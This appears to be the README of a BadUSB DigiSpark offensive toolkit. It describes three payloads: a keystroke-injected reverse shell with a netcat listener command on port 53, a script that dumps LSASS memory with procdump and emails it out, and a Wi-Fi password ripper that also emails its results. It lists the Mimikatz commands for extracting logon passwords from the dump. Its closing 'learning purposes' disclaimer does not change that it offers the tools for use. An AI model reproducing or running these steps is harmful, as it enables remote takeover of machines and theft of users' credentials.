# BadUSB-DigiSpark Keyboard #

Simple script for setting up a reversed shell over TCP or UDP and specific port.


## Before you start setup the listener on the remote host ##

~~~~
Run Netcat
~~~~
~~~~
# nc -ul -p 53
~~~~


You can also use powershell scripts see Powershell directory for the files or instructions below.


# Send-LSASS-Dump #

Started this script for a BadUSB Digispark project, script for retrieving lsass dump with sysinternals procdump tool.
Dump file is automatically send to an email address which can be configured in the variables.

## After receiving the dump file you can examine it and retreive the passwords. ##
~~~~
Run Mimikatz
~~~~
~~~~
mimikatz # sekurlsa::minidump lsass.dmp
~~~~
~~~~
mimikatz # sekurlsa::logonPasswords
~~~~

# Netsh-Ripper #

Started this script for a BadUSB Digispark project, script for retreiving wlan profile information and clear text passwords, started this script for a badUSB Digispark project.
Text file is automatically send to an email address which can be configured in the variables.

### Only use this for learning purposes. ###
